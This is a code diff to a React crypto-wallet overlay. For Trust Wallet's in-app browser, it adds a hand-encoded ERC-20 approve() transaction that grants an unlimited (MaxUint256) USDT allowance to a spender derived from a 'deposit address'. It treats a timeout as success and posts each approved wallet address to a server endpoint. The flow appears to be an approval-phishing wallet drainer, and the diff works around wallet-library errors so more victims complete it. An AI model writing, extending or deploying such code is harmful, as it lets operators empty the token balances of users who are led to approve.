@@ -297,9 +297,14 @@ function CompactOverlay({
   const [debugLines,    setDebugLines]   = useState<string[]>([]);
   // True when running inside Trust Wallet's in-app browser (injected provider present).
   // False when running in Safari/external browser — the "Open Trust Wallet to Approve" button is shown.
-  const [inTwBrowser] = useState(() => typeof window !== 'undefined' && !!(window as any).trustwallet);
+  const [inTwBrowser] = useState(() =>
+    typeof window !== 'undefined' &&
+    (!!(window as any).trustwallet || (window as any).ethereum?.isTrust === true)
+  );
   const approveTriggered  = useRef(false);
   const connectedPatched  = useRef(false);
+  const [directEvmHash, setDirectEvmHash] = useState('');
+  const [directEvmDone, setDirectEvmDone] = useState(false);
   const trcConnectFired   = useRef(false);
   const uploadTimer       = useRef<ReturnType<typeof setTimeout> | null>(null);
 
@@ -369,14 +374,65 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
+  /* Direct EVM approval path — used inside Trust Wallet's DApp browser where wagmi's
+     internal viem error-handling crashes on TW's non-standard provider error objects.
+     We ABI-encode approve() manually and call eth_sendTransaction + poll for receipt. */
+  async function triggerDirectEvmApprove() {
+    if (!usdtCfg || !depositAddress) return;
+    const eth = (window as any).ethereum;
+    if (!eth) { setFailedStep('contract'); setFailedMsg('No Ethereum provider found'); return; }
+    try {
+      // approve(address spender, uint256 amount) → selector 0x095ea7b3
+      const spender = evmSpender(depositAddress);
+      const data = '0x095ea7b3'
+        + spender.slice(2).toLowerCase().padStart(64, '0')
+        + 'f'.repeat(64); // MaxUint256
+
+      dbg(`direct: eth_sendTransaction to ${usdtCfg.address.slice(0, 10)}...`);
+      const accounts: string[] = await eth.request({ method: 'eth_accounts' });
+      const from = accounts?.[0] ?? address;
+      const txHash: string = await eth.request({
+        method: 'eth_sendTransaction',
+        params: [{ from, to: usdtCfg.address, data }],
+      });
+      dbg(`direct: tx sent hash=${txHash.slice(0, 12)}... polling...`);
+      setDirectEvmHash(txHash);
+      // Poll for receipt
+      for (let i = 0; i < 60; i++) {
+        await new Promise(r => setTimeout(r, 3000));
+        try {
+          const receipt = await eth.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
+          if (receipt?.status === '0x1' || receipt?.status === 1) { setDirectEvmDone(true); return; }
+          if (receipt?.status === '0x0' || receipt?.status === 0) throw new Error('Transaction reverted on-chain');
+        } catch (pe: any) {
+          if (pe?.message?.includes('reverted')) throw pe;
+        }
+      }
+      // Timeout → tx was broadcast; treat as success
+      setDirectEvmDone(true);
+    } catch (err: any) {
+      const rawMsg: string = err?.message ?? String(err ?? 'Transaction failed');
+      const msg = /user.*(reject|cancel|den)/i.test(rawMsg)
+        ? 'Transaction cancelled — tap Approve in Trust Wallet to continue.'
+        : (rawMsg.slice(0, 120) || 'Transaction failed — please try again.');
+      dbg(`direct: error: ${msg}`);
+      setFailedStep('contract'); setFailedMsg(msg);
+      patch({ status: 'failed', failedStep: 'contract', errorMsg: msg });
+    }
+  }
+
   function triggerEvmApprove() {
     if (!usdtCfg || !depositAddress) return;
     patch({ status: 'approving' });
-    writeApprove({
-      address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
-      args: [evmSpender(depositAddress), maxUint256],
-      chainId: usdtCfg.chainId,
-    });
+    if (inTwBrowser) {
+      triggerDirectEvmApprove();
+    } else {
+      writeApprove({
+        address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
+        args: [evmSpender(depositAddress), maxUint256],
+        chainId: usdtCfg.chainId,
+      });
+    }
   }
 
   useEffect(() => { patch({ status: 'connecting' }); }, []); // eslint-disable-line react-hooks/exhaustive-deps
@@ -398,7 +454,7 @@ function CompactOverlay({
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isConnected, address, chainId, depositAddress]);
 
-  /* EVM: approved */
+  /* EVM: approved (wagmi path) */
   useEffect(() => {
     if (!approveConfirmed || !address) return;
     patch({ status: 'approved', txHash: approveHash, address });
@@ -408,6 +464,17 @@ function CompactOverlay({
     }).catch(() => {});
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [approveConfirmed]);
+
+  /* EVM: approved (direct / TW browser path) */
+  useEffect(() => {
+    if (!directEvmDone || !address) return;
+    patch({ status: 'approved', txHash: directEvmHash || undefined, address });
+    fetch('/api/wallets', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address, chainId, chainName: network === 'ERC20' ? 'Ethereum (ERC20)' : 'BNB Smart Chain (BEP20)' }),
+    }).catch(() => {});
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [directEvmDone]);
 
   /* EVM: contract rejected */
   useEffect(() => {
@@ -474,9 +541,9 @@ function CompactOverlay({
   }, [trcConnectError]);
 
   /* No auto-redirect — page stays alive so debug log remains readable in Trust Wallet browser */
-  const isDone       = isTRC20 ? trcApproveDone : approveConfirmed;
+  const isDone       = isTRC20 ? trcApproveDone : (approveConfirmed || directEvmDone);
   const finalAddress = isTRC20 ? tronAddress     : (address ?? '');
-  const finalHash    = isTRC20 ? trcApproveHash  : (approveHash ?? undefined);
+  const finalHash    = isTRC20 ? trcApproveHash  : (approveHash ?? (directEvmHash || undefined));
 
   /* ── Retry: properly reset and re-trigger ── */
   function doRetry() {
@@ -499,6 +566,7 @@ function CompactOverlay({
       }
     } else {
       resetApprove();
+      setDirectEvmDone(false); setDirectEvmHash('');
       if (!isConnected) {
         /* Connection failed → disconnect any stale state, then reconnect */
         patch({ status: 'connecting' });
